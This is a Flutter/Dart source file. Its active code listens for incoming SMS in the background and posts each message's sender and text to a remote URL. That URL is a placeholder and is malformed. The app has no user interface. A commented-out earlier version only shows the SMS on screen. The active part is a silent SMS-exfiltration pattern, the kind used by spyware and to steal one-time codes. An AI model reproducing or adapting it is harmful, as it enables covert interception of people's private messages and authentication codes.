// ignore_for_file: unused_import

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:telephony/telephony.dart';
import 'package:http/http.dart';

final Telephony telephony = Telephony.instance;

backgroundMessageHandler(SmsMessage message) async {
  print("Background SMS: ${message.body}");
}

void main(){
   telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) async {
        final response = await http.post(
          Uri.parse("https:google.com"),
          body:{
            "from":message.address,
            "text":message.body,
          },
        );
        print("Reponse du serveur: ${response.body}");
      },
      listenInBackground: true,
      onBackgroundMessage: backgroundMessageHandler,
    );
}

/*backgroundMessageHandler(SmsMessage message) async {
  print("Background SMS: ${message.body}");
}

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: InboxPage(),
    );
  }
}

class InboxPage extends StatefulWidget {
  const InboxPage({super.key});

  @override
  _InboxPageState createState() => _InboxPageState();
}

class _InboxPageState extends State<InboxPage> {
  // Liste pour stocker les messages reçus
  List<SmsMessage> messages = [];

  @override
  void initState() {
    super.initState();
    listenIncomingSms();
  }

  void listenIncomingSms() {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        setState(() {
          messages.insert(0, message); // ajoute le dernier SMS en haut de la liste
        });
      },
      onBackgroundMessage: backgroundMessageHandler,
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text("SMS Listener")),
      body: messages.isEmpty
          ? Center(child: Text("En attente de SMS..."))
          : ListView.builder(
              itemCount: messages.length,
              itemBuilder: (context, index) {
                final sms = messages[index];
                return ListTile(
                  title: Text(sms.body ?? "Message vide"),
                  subtitle: Text("De: ${sms.address ?? 'Inconnu'}"),
                );
              },
            ),
    );
  }
}
*/